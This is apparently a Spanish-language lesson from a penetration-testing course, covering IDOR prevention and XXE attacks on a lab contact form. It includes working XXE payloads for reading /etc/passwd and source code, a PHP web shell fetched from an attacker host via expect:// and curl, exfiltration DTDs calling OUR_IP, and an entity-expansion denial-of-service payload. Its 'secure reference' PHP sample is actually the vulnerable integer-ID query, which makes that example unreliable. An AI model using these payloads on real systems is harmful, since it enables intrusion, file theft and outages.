Con nuestro nuevo `role`, también podemos realizar asignaciones masivas para cambiar campos específicos para todos los usuarios, como colocar cargas útiles XSS en sus perfiles o cambiar su correo electrónico a un correo electrónico que especifiquemos. `Try to write a script that changes all users' email to an email you choose.`. Puede hacerlo recuperando su `uuids` y luego enviar un `PUT` solicitud para cada uno con el nuevo correo electrónico.


# Prevención IDOR

---

Aprendimos varias formas de identificar y explotar las vulnerabilidades de IDOR en páginas web, funciones web y llamadas API. Por ahora, deberíamos haber entendido que las vulnerabilidades de IDOR son causadas principalmente por un control de acceso inadecuado en los servidores de back-end. Para evitar tales vulnerabilidades, primero tenemos que construir un sistema de control de acceso a nivel de objeto y luego usar referencias seguras para nuestros objetos al almacenarlos y llamarlos.

---

## Control de Acceso a Nivel de Objeto

Un sistema de Control de Acceso debe estar en el núcleo de cualquier aplicación web, ya que puede afectar a todo su diseño y estructura. Para controlar adecuadamente cada área de la aplicación web, su diseño tiene que soportar la segmentación de roles y permisos de forma centralizada. Sin embargo, Access Control es un tema muy amplio, por lo que solo nos centraremos en su papel en las vulnerabilidades de IDOR, representadas en `Object-Level` mecanismos de control de acceso.

Los roles y permisos de usuario son una parte vital de cualquier sistema de control de acceso, que se realiza completamente en un sistema de Control de Acceso Basado en Rol (RBAC). Para evitar explotar las vulnerabilidades de IDOR, debemos asignar el RBAC a todos los objetos y recursos. El servidor de back-end puede permitir o denegar cada solicitud, dependiendo de si el rol del solicitante tiene suficientes privilegios para acceder al objeto o al recurso.

Una vez que se ha implementado un RBAC, a cada usuario se le asignaría un rol que tiene ciertos privilegios. A cada solicitud que realice el usuario, sus roles y privilegios se probarán para ver si tienen acceso al objeto que está solicitando. Solo se les permitiría acceder a él si tienen derecho a hacerlo.

Hay muchas maneras de implementar un sistema RBAC y asignarlo a los objetos y recursos de la aplicación web, y diseñarlo en el núcleo de la estructura de la aplicación web es un arte para perfeccionar. El siguiente es un código de muestra de cómo una aplicación web puede comparar roles de usuario con objetos para permitir o denegar el control de acceso:

Código: javascript

```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

El ejemplo anterior utiliza el `user` token, que puede ser `mapped from the HTTP request made to the RBAC` para recuperar los diversos roles y privilegios del usuario. Luego, solo permite el acceso de lectura/escritura si el usuario `uid` en el sistema RBAC coincide con el `uid` en el punto final de la API que están solicitando. Además, si un usuario tiene `admin` como su papel en el RBAC de back-end, se les permite el acceso de lectura/escritura.

En nuestros ataques anteriores, vimos ejemplos de la función de usuario que se almacena en los detalles del usuario o en su cookie, los cuales están bajo el control del usuario y pueden ser manipulados para escalar sus privilegios de acceso. El ejemplo anterior demuestra un enfoque más seguro para mapear roles de usuario, como los privilegios de usuario `were not be passed through the HTTP request`, pero asignado directamente desde el RBAC en el back-end utilizando el token de sesión de inicio de sesión del usuario como mecanismo de autenticación.

Hay mucho más para acceder a los sistemas de control y RBAC, ya que pueden ser algunos de los sistemas más desafiantes para diseñar. Esto, sin embargo, debería darnos una idea de cómo debemos controlar el acceso de los usuarios a través de los objetos y recursos de las aplicaciones web.

---

## Referencia de Objetos

Si bien el problema central con IDOR radica en el control de acceso roto (`Insecure`), tener acceso a referencias directas a objetos (`Direct Object Referencing`) permite enumerar y explotar estas vulnerabilidades de control de acceso. Todavía podemos usar referencias directas, pero solo si tenemos un sistema de control de acceso sólido implementado.

Incluso después de construir un sistema de control de acceso sólido, nunca debemos usar referencias de objetos en texto claro o patrones simples (por ejemplo. `uid=1`). Siempre debemos usar referencias fuertes y únicas, como hashes salados o `UUID`es. Por ejemplo, podemos usar `UUID V4` para generar una identificación fuertemente aleatoria para cualquier elemento, que se parece a (`89c9b29b-d19f-4515-b2dd-abb6e693eb20`). Entonces, podemos mapear esto `UUID` al objeto al que se hace referencia en la base de datos de back-end, y siempre que esto `UUID` se llama, la base de datos de back-end sabría qué objeto devolver. El siguiente ejemplo de código PHP nos muestra cómo puede funcionar esto:

Código: php

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result));
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```

Además, como hemos visto anteriormente en el módulo, nunca debemos calcular hashes en el front-end. Deberíamos generarlos cuando se crea un objeto y almacenarlos en la base de datos de back-end. Luego, debemos crear mapas de bases de datos para permitir una rápida referencia cruzada de objetos y referencias.

Finalmente, debemos tener en cuenta que el uso de `UUID`s puede permitir que las vulnerabilidades de IDOR no se detecten, ya que hace que sea más difícil probar las vulnerabilidades de IDOR. Esta es la razón por la cual la referencia de objetos fuertes es siempre el segundo paso después de implementar un sistema de control de acceso sólido. Además, algunas de las técnicas que aprendimos en este módulo funcionarían incluso con referencias únicas si el sistema de control de acceso está roto, como repetir la solicitud de un usuario con la sesión de otro usuario, como hemos visto anteriormente.

Si implementamos estos dos mecanismos de seguridad, deberíamos estar relativamente seguros contra las vulnerabilidades de IDOR.


# Introducción a XXE

---

`XML External Entity (XXE) Injection` las vulnerabilidades se producen cuando los datos XML se toman de una entrada controlada por el usuario sin desinfectarlos adecuadamente o analizarlos de forma segura, lo que puede permitirnos usar funciones XML para realizar acciones maliciosas. Las vulnerabilidades XXE pueden causar daños considerables a una aplicación web y a su servidor de back-end, desde la divulgación de archivos confidenciales hasta el cierre del servidor de back-end, por lo que se considera uno de los [Los 10 principales riesgos de Seguridad Web](https://owasp.org/www-project-top-ten/) por OWASP.

---

## XML

`Extensible Markup Language (XML)` es un lenguaje de marcado común (similar a HTML y SGML) diseñado para la transferencia flexible y el almacenamiento de datos y documentos en varios tipos de aplicaciones. XML no se centra en mostrar datos, sino principalmente en almacenar datos de documentos y representar estructuras de datos. Los documentos XML están formados por árboles de elementos, donde cada elemento se denota esencialmente por un `tag`y el primer elemento se llama el `root element`, mientras que otros elementos son `child elements`.

Aquí vemos un ejemplo básico de un documento XML que representa una estructura de documento de correo electrónico:

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```

El ejemplo anterior muestra algunos de los elementos clave de un documento XML, como:

|Clave|Definición|Ejemplo|
|---|---|---|
|`Tag`|Las claves de un documento XML, generalmente envueltas con (`<`/`>`) caracteres.|`<date>`|
|`Entity`|Variables XML, generalmente envueltas con (`&`/`;`) caracteres.|`&lt;`|
|`Element`|El elemento raíz o cualquiera de sus elementos secundarios, y su valor se almacena entre una etiqueta inicial y una etiqueta final.|`<date>01-01-2022</date>`|
|`Attribute`|Especificaciones opcionales para cualquier elemento que se almacene en las etiquetas, que puede ser utilizado por el analizador XML.|`version="1.0"`/`encoding="UTF-8"`|
|`Declaration`|Por lo general, la primera línea de un documento XML, y define la versión XML y la codificación a utilizar al analizarlo.|`<?xml version="1.0" encoding="UTF-8"?>`|

Además, algunos caracteres se utilizan como parte de una estructura de documento XML, como `<`, `>`, `&`, o `"`. Por lo tanto, si necesitamos usarlos en un documento XML, debemos reemplazarlos con sus referencias de entidad correspondientes (por ejemplo. `&lt;`, `&gt;`, `&amp;`, `&quot;`). Finalmente, podemos escribir comentarios en documentos XML entre `<!--` y `-->`, similar a los documentos HTML.

---

## DTD XML

`XML Document Type Definition (DTD)`permite la validación de un documento XML contra una estructura de documento predefinida. La estructura de documento predefinida se puede definir en el propio documento o en un archivo externo. El siguiente es un ejemplo de DTD para el documento XML que vimos anteriormente:

Código: xml

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

Como podemos ver, el DTD está declarando la raíz `email` elemento con el `ELEMENT` declaración de tipo y luego denotando sus elementos secundarios. Después de eso, cada uno de los elementos secundarios también se declara, donde algunos de ellos también tienen elementos secundarios, mientras que otros solo pueden contener datos sin procesar (como se indica por `PCDATA`).

El DTD anterior se puede colocar dentro del propio documento XML, justo después del `XML Declaration` en la primera línea. De lo contrario, se puede almacenar en un archivo externo (por ejemplo. `email.dtd`), y luego se hace referencia dentro del documento XML con el `SYSTEM` palabra clave, de la siguiente manera:

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

También es posible hacer referencia a un DTD a través de una URL, de la siguiente manera:

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

Esto es relativamente similar a cómo los documentos HTML definen y hacen referencia a los scripts de JavaScript y CSS.

---

## Entidades XML

También podemos definir entidades personalizadas (es decir. Variables XML) en DTD XML, para permitir la refactorización de variables y reducir los datos repetitivos. Esto se puede hacer con el uso de la `ENTITY` palabra clave, que es seguida por el nombre de la entidad y su valor, de la siguiente manera:

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Una vez que definimos una entidad, se puede hacer referencia en un documento XML entre un ampersand `&` y un semi-colon `;` (p. ej. `&company;`). Cada vez que se hace referencia a una entidad, será reemplazada por su valor por el analizador XML. Lo más interesante, sin embargo, podemos `reference External XML Entities` con el `SYSTEM` palabra clave, que es seguida por la ruta de la entidad externa, de la siguiente manera:

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

**Nota:** También podemos usar el `PUBLIC` palabra clave en lugar de `SYSTEM` para cargar recursos externos, que se utiliza con entidades y estándares declarados públicamente, como un código de idioma (`lang="en"`). En este módulo, estaremos usando `SYSTEM`, pero deberíamos poder usar cualquiera en la mayoría de los casos.

Esto funciona de manera similar a las entidades XML internas definidas dentro de los documentos. Cuando hacemos referencia a una entidad externa (p. ej. `&signature;`), el analizador reemplazará a la entidad con su valor almacenado en el archivo externo (por ejemplo. `signature.txt`). `When the XML file is parsed on the server-side, in cases like SOAP (XML) APIs or web forms, then an entity can reference a file stored on the back-end server, which may eventually be disclosed to us when we reference the entity`.

En la siguiente sección, veremos cómo podemos usar Entidades XML Externas para leer archivos locales o incluso realizar más acciones maliciosas.


# Divulgación de Archivo Local

---

Cuando una aplicación web confía en datos XML sin filtrar de la entrada del usuario, es posible que podamos hacer referencia a un documento DTD XML externo y definir nuevas entidades XML personalizadas. Supongamos que podemos definir nuevas entidades y hacer que se muestren en la página web. En ese caso, también deberíamos poder definir entidades externas y hacerles referencia a un archivo local, que, cuando se muestra, debería mostrarnos el contenido de ese archivo en el servidor de back-end.

Veamos cómo podemos identificar posibles vulnerabilidades XXE y explotarlas para leer archivos confidenciales del servidor de back-end.

---

## Identificando

El primer paso para identificar posibles vulnerabilidades XXE es encontrar páginas web que acepten una entrada de usuario XML. Podemos comenzar el ejercicio al final de esta sección, que tiene un `Contact Form`:

   

![Formulario de contacto con campos para nombre completo, correo electrónico, número de teléfono y consulta. Incluye dirección, número de teléfono de consultas urgentes y correo electrónico de soporte general](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg)

Si rellenamos el formulario de contacto y hacemos clic en `Send Data`, luego intercepte la solicitud HTTP con Burp, obtenemos la siguiente solicitud:

![Solicitud HTTP POST a /submitDetails.php con datos XML que incluyen campos 'nombre', 'tel', 'correo electrónico' y 'mensaje'](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg)

Como podemos ver, el formulario parece estar enviando nuestros datos en formato XML al servidor web, lo que lo convierte en un posible objetivo de prueba XXE. Supongamos que la aplicación web utiliza bibliotecas XML obsoletas y no aplica ningún filtro o desinfección en nuestra entrada XML. En ese caso, es posible que podamos explotar este formulario XML para leer archivos locales.

Si enviamos el formulario sin ninguna modificación, recibimos el siguiente mensaje:

![Solicitud HTTP POST a /submitDetails.php con datos XML que incluyen campos 'nombre', 'tel', 'correo electrónico' y 'mensaje'. Respuesta: HTTP/1.1 200 OK, mensaje 'Compruebe su correo electrónico email@xxe.htbl para más instrucciones.'](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg)

Vemos que el valor de la `email` el elemento se nos muestra en la página. Para imprimir el contenido de un archivo externo a la página, debemos `note which elements are being displayed, such that we know which elements to inject into`. En algunos casos, no se pueden mostrar elementos, que cubriremos cómo explotar en las próximas secciones.

Por ahora, sabemos que cualquier valor que pongamos en el `<email></email>` el elemento se muestra en la respuesta HTTP. Entonces, tratemos de definir una nueva entidad y luego utilicémosla como una variable en el `email` elemento para ver si se reemplaza con el valor que definimos. Para ello, podemos utilizar lo aprendido en el apartado anterior para definir nuevas entidades XML y añadir las siguientes líneas después de la primera línea en la entrada XML:

Código: xml

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

**Nota:** En nuestro ejemplo, la entrada XML en la solicitud HTTP no tenía DTD declarado dentro de los datos XML en sí, o se hace referencia externamente, por lo que añadimos un nuevo DTD antes de definir nuestra entidad. Si el `DOCTYPE` ya fue declarado en la solicitud XML, solo agregaríamos el `ENTITY` elemento a ello.

Ahora, deberíamos tener una nueva entidad XML llamada `company`, con el que podemos hacer referencia `&company;`. Entonces, en lugar de usar nuestro correo electrónico en el `email` elemento, intentemos usar `&company;`, y ver si será reemplazado por el valor que definimos (`Inlane Freight`):

![Solicitud HTTP POST a /submitDetails.php con datos XML que incluyen campos 'nombre', 'tel', 'correo electrónico' y 'mensaje'. Respuesta: HTTP/1.1 200 OK, mensaje 'Compruebe su correo electrónico Inlane Freight para obtener más instrucciones.'](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg)

Como podemos ver, la respuesta usó el valor de la entidad que definimos (`Inlane Freight`) en lugar de mostrar `&company;`, indicando que podemos inyectar código XML. Por el contrario, se mostraría una aplicación web no vulnerable (`&company;`) como valor en bruto. `This confirms that we are dealing with a web application vulnerable to XXE`.

**Nota:** Algunas aplicaciones web pueden predeterminar un formato JSON en una solicitud HTTP, pero aún pueden aceptar otros formatos, incluido XML. Por lo tanto, incluso si una aplicación web envía solicitudes en formato JSON, podemos intentar cambiar el `Content-Type` encabezado a `application/xml`, y luego convertir los datos JSON a XML con un [herramienta en línea](https://www.convertjson.com/json-to-xml.htm). Si la aplicación web acepta la solicitud con datos XML, también podemos probarla contra vulnerabilidades XXE, lo que puede revelar una vulnerabilidad XXE imprevista.

---

## Lectura de Archivos Sensibles

Ahora que podemos definir nuevas entidades XML internas, veamos si podemos definir entidades XML externas. Hacerlo es bastante similar a lo que hicimos antes, pero solo agregaremos el `SYSTEM` palabra clave y definir la ruta de referencia externa después de ella, como hemos aprendido en la sección anterior:

Código: xml

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Enviemos ahora la solicitud modificada y veamos si el valor de nuestra entidad XML externa se establece en el archivo al que hacemos referencia:

![Solicitud HTTP POST a /submitDetails.php con datos XML que incluyen campos 'nombre', 'tel', 'correo electrónico' y 'mensaje'. Respuesta: HTTP/1.1 200 OK, mostrando el contenido de /etc/passwd](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg)

Vemos que efectivamente obtuvimos el contenido de la `/etc/passwd` archivo, `meaning that we have successfully exploited the XXE vulnerability to read local files`. Esto nos permite leer el contenido de archivos confidenciales, como archivos de configuración que pueden contener contraseñas u otros archivos confidenciales como un `id_rsa` Clave SSH de un usuario específico, que puede otorgarnos acceso al servidor de back-end. Podemos referirnos al [Inclusión de archivos / Recorrido de Directorio](https://academy.hackthebox.com/course/preview/file-inclusion) módulo para ver qué ataques se pueden llevar a cabo a través de la divulgación de archivos locales.

**Consejo:** En ciertas aplicaciones web de Java, también podemos especificar un directorio en lugar de un archivo, y obtendremos una lista de directorios en su lugar, lo que puede ser útil para localizar archivos confidenciales.

---

## Lectura Código Fuente

Otro beneficio de la divulgación de archivos locales es la capacidad de obtener el código fuente de la aplicación web. Esto nos permitiría realizar un `Whitebox Penetration Test` para revelar más vulnerabilidades en la aplicación web, o al menos revelar configuraciones secretas como contraseñas de bases de datos o claves API.

Entonces, veamos si podemos usar el mismo ataque para leer el código fuente del `index.php` archivo, de la siguiente manera:

![Solicitud HTTP POST a /submitDetails.php con datos XML que incluyen campos 'nombre', 'tel', 'correo electrónico' y 'mensaje'. Respuesta: HTTP/1.1 200 OK, mensaje 'Compruebe su correo electrónico para obtener más instrucciones.'](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)

Como podemos ver, esto no funcionó, ya que no obtuvimos ningún contenido. Esto sucedió porque `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. Si un archivo contiene algunos de los caracteres especiales de XML (por ejemplo. `<`/`>`/`&`), rompería la referencia de entidad externa y no se utilizaría para la referencia. Además, no podemos leer ningún dato binario, ya que tampoco se ajustaría al formato XML.

Afortunadamente, PHP proporciona filtros de envoltura que nos permiten base64 codificar ciertos recursos 'incluyendo archivos', en cuyo caso la salida final base64 no debe romper el formato XML. Para hacerlo, en lugar de usar `file://` como nuestra referencia, usaremos PHP's `php://filter/` envoltura. Con este filtro, podemos especificar el `convert.base64-encode` codificador como nuestro filtro, y luego añadir un recurso de entrada (por ejemplo. `resource=index.php`), como sigue:

Código: xml

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Con eso, podemos enviar nuestra solicitud, y obtendremos la cadena codificada base64 de la `index.php` archivo:

![Solicitud HTTP POST a /submitDetails.php con datos XML que incluyen campos 'nombre', 'tel', 'correo electrónico' y 'mensaje'. Respuesta: HTTP/1.1 200 OK, mensaje 'Compruebe su correo electrónico para obtener más instrucciones.' Los datos codificados de Base64 están presentes en la respuesta.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)

Podemos seleccionar la cadena base64, hacer clic en la pestaña Inspector de Burp (en el panel derecho) y nos mostrará el archivo decodificado. Para obtener más información sobre los filtros PHP, puede consultar el [Inclusión de archivos / Recorrido de Directorio](https://academy.hackthebox.com/module/details/23) módulo.

`This trick only works with PHP web applications.`La siguiente sección discutirá un método más avanzado para leer el código fuente, que debería funcionar con cualquier marco web.

---

## Ejecución Remota de Código con XXE

Además de leer archivos locales, es posible que podamos obtener la ejecución de código a través del servidor remoto. El método más fácil sería buscar `ssh` claves, o intentar utilizar un truco de robo de hash en aplicaciones web basadas en Windows, haciendo una llamada a nuestro servidor. Si estos no funcionan, es posible que podamos ejecutar comandos en aplicaciones web basadas en PHP a través de `PHP://expect` filtro, aunque esto requiere el PHP `expect` módulo a instalar y habilitar.

Si el XXE imprime directamente su salida 'como se muestra en esta sección', entonces podemos ejecutar comandos básicos como `expect://id`y la página debe imprimir la salida del comando. Sin embargo, si no teníamos acceso a la salida, o necesitábamos ejecutar un comando más complicado 'por ejemplo, shell inverso', entonces la sintaxis XML puede romperse y el comando puede no ejecutarse.

El método más eficiente para convertir XXE en RCE es obtener un shell web de nuestro servidor y escribirlo en la aplicación web, y luego podemos interactuar con él para ejecutar comandos. Para hacerlo, podemos comenzar escribiendo un shell web PHP básico e iniciando un servidor web python, de la siguiente manera:

  Divulgación de Archivo Local

```shell-session
vcrdcr@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
vcrdcr@htb[/htb]$ sudo python3 -m http.server 80
```

Ahora, podemos usar el siguiente código XML para ejecutar un `curl` comando que descarga nuestro shell web en el servidor remoto:

Código: xml

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

**Nota:** Reemplazamos todos los espacios en el código XML anterior con `$IFS`, para evitar romper la sintaxis XML. Además, a muchos otros personajes les gusta `|`, `>`, y `{` puede romper el código, por lo que debemos evitar usarlos.

Una vez que enviamos la solicitud, debemos recibir una solicitud en nuestra máquina para el `shell.php` archivo, después de lo cual podemos interactuar con el shell web en el servidor remoto para la ejecución de código.

**Nota:** El módulo expect no está habilitado/instalado de forma predeterminada en los servidores PHP modernos, por lo que es posible que este ataque no siempre funcione. Esta es la razón por la cual XXE se usa generalmente para revelar archivos locales confidenciales y código fuente, lo que puede revelar vulnerabilidades adicionales o formas de obtener la ejecución del código.

## Otros Ataques XXE

Otro ataque común a menudo llevado a cabo a través de vulnerabilidades XXE es la explotación de la SSRF, que se utiliza para enumerar puertos abiertos localmente y acceder a sus páginas, entre otras páginas web restringidas, a través de la vulnerabilidad XXE. El [Ataques del lado del Servidor](https://academy.hackthebox.com/course/preview/server-side-attacks) el módulo cubre a fondo la SSRF, y las mismas técnicas se pueden llevar a cabo con ataques XXE.

Finalmente, un uso común de los ataques XXE está causando una Denegación de Servicio (DOS) al servidor web de alojamiento, con el uso de la siguiente carga útil:

Código: xml

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

Esta carga útil define el `a0` entidad como `DOS`, lo hace referencia en `a1` varias veces, referencias `a1` en `a2`y así sucesivamente hasta que la memoria del servidor de back-end se agote debido a los bucles de autorreferencia. Sin embargo, `this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference`. Pruébelo contra este ejercicio y vea si funciona.


# Divulgación Avanzada de Archivos

---

No todas las vulnerabilidades XXE pueden ser fáciles de explotar, como hemos visto en la sección anterior. Algunos formatos de archivo pueden no ser legibles a través de XXE básico, mientras que en otros casos, la aplicación web puede no generar ningún valor de entrada en algunos casos, por lo que podemos intentar forzarlo a través de errores.

---

## Exfiltración Avanzada con CDATA

En la sección anterior, vimos cómo podíamos usar filtros PHP para codificar archivos de origen PHP, de modo que no romperían el formato XML cuando se hace referencia, lo que (como vimos) nos impidió leer estos archivos. Pero, ¿qué pasa con otros tipos de Aplicaciones Web? Podemos utilizar otro método para extraer cualquier tipo de datos (incluidos los datos binarios) para cualquier backend de aplicación web. Para generar datos que no se ajustan al formato XML, podemos envolver el contenido de la referencia del archivo externo con un `CDATA` etiqueta (p. ej. `<![CDATA[ FILE_CONTENT ]]>`). De esta manera, el analizador XML consideraría esta parte de datos sin procesar, que pueden contener cualquier tipo de datos, incluidos los caracteres especiales.

Una manera fácil de abordar este problema sería definir un `begin` entidad interna con `<![CDATA[`, un `end` entidad interna con `]]>`, y luego coloque nuestro archivo de entidad externa en el medio, y debe considerarse como un `CDATA` elemento, como sigue:

Código: xml

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

Después de eso, si hacemos referencia al `&joined;` entidad, debe contener nuestros datos escapados. Sin embargo, `this will not work, since XML prevents joining internal and external entities`, entonces tendremos que encontrar una mejor manera de hacerlo.

Para evitar esta limitación, podemos utilizar `XML Parameter Entities`, un tipo especial de entidad que comienza con un `%` carácter y solo se puede utilizar dentro del DTD. Lo que es único acerca de las entidades de parámetros es que si las hacemos referencia desde una fuente externa (por ejemplo, nuestro propio servidor), entonces todas ellas se considerarían externas y se pueden unir, de la siguiente manera:

Código: xml

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Entonces, intentemos leer el `submitDetails.php` archivo almacenando primero la línea anterior en un archivo DTD (por ejemplo. `xxe.dtd`), alojarlo en nuestra máquina y luego referenciarlo como una entidad externa en la aplicación web de destino, de la siguiente manera:

  Divulgación Avanzada de Archivos

```shell-session
vcrdcr@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
vcrdcr@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Ahora, podemos hacer referencia a nuestra entidad externa (`xxe.dtd`) y luego imprimir el `&joined;` entidad que definimos anteriormente, que debe contener el contenido de la `submitDetails.php` archivo, de la siguiente manera:

Código: xml

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

Una vez que escribamos nuestro `xxe.dtd` archivo, alojarlo en nuestra máquina, y luego agregar las líneas anteriores a nuestra solicitud HTTP a la aplicación web vulnerable, finalmente podemos obtener el contenido de la `submitDetails.php` archivo: ![Imagen que muestra una solicitud HTTP POST a /submitDetails.php con datos XML, incluida una declaración DOCTYPE para un ataque XXE. La respuesta es un HTTP 200 OK con entrada XML de procesamiento de código PHP, potencialmente vulnerable a XXE.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg)

Como podemos ver, pudimos obtener el código fuente del archivo sin necesidad de codificarlo en base64, lo que ahorra mucho tiempo al pasar por varios archivos para buscar secretos y contraseñas.

**Nota:** En algunos servidores web modernos, es posible que no podamos leer algunos archivos (como index.php), ya que el servidor web evitaría un ataque DOS causado por la autorreferencia de archivo/entidad (es decir, bucle de referencia de entidad XML), como se mencionó en la sección anterior.

Este truco puede ser muy útil cuando el método básico XXE no funciona o cuando se trata de otros marcos de desarrollo web. `Try to use this trick to read other files`.

---

## Error Basado XXE

Otra situación en la que podemos encontrarnos es en la que la aplicación web puede no escribir ninguna salida, por lo que no podemos controlar ninguna de las entidades de entrada XML para escribir su contenido. En tales casos, lo seríamos `blind` a la salida XML y por lo tanto no sería capaz de recuperar el contenido del archivo utilizando nuestros métodos habituales.

Si la aplicación web muestra errores de tiempo de ejecución (por ejemplo, errores de PHP) y no tiene un manejo de excepciones adecuado para la entrada XML, entonces podemos usar este defecto para leer la salida del exploit XXE. Si la aplicación web no escribe la salida XML ni muestra ningún error, nos enfrentaríamos a una situación completamente ciega, que discutiremos en la siguiente sección.

Consideremos el ejercicio que tenemos en `/error` al final de esta sección, en la que ninguna de las entidades de entrada XML se muestra en la pantalla. Debido a esto, no tenemos ninguna entidad que podamos controlar para escribir la salida del archivo. Primero, intentemos enviar datos XML malformados y veamos si la aplicación web muestra algún error. Para hacerlo, podemos eliminar cualquiera de las etiquetas de cierre, cambiar una de ellas, para que no se cierre (por ejemplo. `<roo>` en lugar de `<root>`), o simplemente hacer referencia a una entidad no existente, de la siguiente manera: ![Solicitud HTTP POST a /error/submitDetails.php con datos XML que causan un error 'nonExistingEntity' en la respuesta PHP.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg)

Vemos que efectivamente hicimos que la aplicación web mostrara un error, y también reveló el directorio del servidor web, que podemos usar para leer el código fuente de otros archivos. Ahora, podemos explotar esta falla para exfiltrar el contenido del archivo. Para hacerlo, utilizaremos una técnica similar a la que usamos anteriormente. Primero, alojaremos un archivo DTD que contiene la siguiente carga útil:

Código: xml

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

La carga útil anterior define el `file` entidad de parámetros y luego se une a ella con una entidad que no existe. En nuestro ejercicio anterior, estábamos uniendo tres cuerdas. En este caso, `%nonExistingEntity;` no existe, por lo que la aplicación web arrojaría un error diciendo que esta entidad no existe, junto con nuestro unido `%file;` como parte del error. Hay muchas otras variables que pueden causar un error, como un URI incorrecto o tener caracteres incorrectos en el archivo de referencia.

Ahora, podemos llamar a nuestro script DTD externo, y luego hacer referencia al `error` entidad, de la siguiente manera:

Código: xml

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

